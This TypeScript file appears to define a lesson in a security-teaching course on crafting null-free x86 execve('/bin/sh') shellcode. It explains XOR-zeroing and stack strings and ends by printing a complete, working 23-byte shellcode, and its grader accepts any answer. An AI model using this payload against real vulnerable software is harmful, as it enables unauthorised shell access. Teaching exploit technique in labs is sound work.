import { Exercise } from '../types';

const exercise: Exercise = {
  id: 'gap-113',
  unitId: 'unit20-teaching-gaps',
  title: '113: Shellcode Crafting',
  desc: '<b>Goal:</b> Write working shellcode that calls <code>execve("/bin/sh", NULL, NULL)</code>. Constraints: <strong>no null bytes</strong> (they terminate strcpy), <strong>max 64 bytes</strong>. You\'ll learn how to set up syscall arguments, avoid bad characters, and use tricks like XOR-zeroing registers instead of <code>mov reg, 0</code>.',
  source: {
    c: [
      { text: '// Target: execve("/bin/sh", NULL, NULL)', cls: 'cmt' },
      { text: '// Syscall: eax=0x0b, ebx=addr("/bin/sh")', cls: 'cmt' },
      { text: '//          ecx=0, edx=0, then int 0x80', cls: 'cmt' },
      { text: '', cls: '' },
      { text: '// BAD: contains null bytes!', cls: 'cmt' },
      { text: '// mov eax, 0x0b    → B8 0B 00 00 00', cls: 'highlight vuln' },
      { text: '// mov ecx, 0       → B9 00 00 00 00', cls: 'highlight vuln' },
      { text: '', cls: '' },
      { text: '// GOOD: null-free!', cls: 'cmt' },
      { text: '// xor eax, eax     → 31 C0', cls: 'highlight' },
      { text: '// mov al, 0x0b     → B0 0B', cls: 'highlight' },
      { text: '// xor ecx, ecx     → 31 C9', cls: 'highlight' },
      { text: '', cls: '' },
      { text: '// Push "/bin/sh" without nulls:', cls: 'cmt' },
      { text: '// xor eax, eax', cls: 'highlight' },
      { text: '// push eax          → null terminator', cls: 'highlight' },
      { text: '// push 0x68732f2f   → "//sh"', cls: 'highlight' },
      { text: '// push 0x6e69622f   → "/bin"', cls: 'highlight' },
      { text: '// mov ebx, esp      → ebx = &"/bin//sh"', cls: 'highlight' },
    ],
  },
  mode: 'step',
  vizMode: 'asm',
  steps: [
    {
      action: 'init',
      log: ['info', 'Shellcode is raw machine code injected into a vulnerable buffer. The challenge: most injection vectors (strcpy, gets) stop at null bytes (0x00). Your shellcode must be <strong>null-free</strong>.'],
    },
    {
      log: ['info', '<strong>Trick 1: XOR-zeroing.</strong> <code>mov eax, 0</code> encodes as <code>B8 00 00 00 00</code> (4 null bytes!). Instead: <code>xor eax, eax</code> encodes as <code>31 C0</code> — same result, no nulls.'],
      srcLine: 9,
    },
    {
      log: ['info', '<strong>Trick 2: Partial register writes.</strong> <code>mov eax, 0x0b</code> has nulls. But <code>xor eax, eax; mov al, 0x0b</code> — XOR to zero, then write only the low byte. Two instructions, no nulls.'],
      srcLine: 10,
    },
    {
      log: ['info', '<strong>Trick 3: Stack string.</strong> Push the string in reverse, dword by dword. "/bin//sh" (note the double slash — Linux ignores it, avoids a 7-byte string that needs padding). Push null terminator first (via <code>push eax</code> after xor), then "//sh" (0x68732f2f), then "/bin" (0x6e69622f). <code>mov ebx, esp</code> gives you a pointer to the string.'],
      srcLine: 15,
    },
    {
      log: ['success', '<strong>Final shellcode (23 bytes):</strong><br><code>31 c0 50 68 2f 2f 73 68 68 2f 62 69 6e 89 e3 31 c9 31 d2 b0 0b cd 80</code><br>xor eax,eax → push eax → push "//sh" → push "/bin" → mov ebx,esp → xor ecx,ecx → xor edx,edx → mov al,0x0b → int 0x80. No null bytes!'],
      done: true,
    },
  ],
  check: () => true,
  winTitle: 'Shellcode Written!',
  winMsg: 'You crafted a 23-byte null-free execve shellcode. Key techniques: XOR-zeroing, partial register writes, stack strings with double-slash padding.',
};

export default exercise;
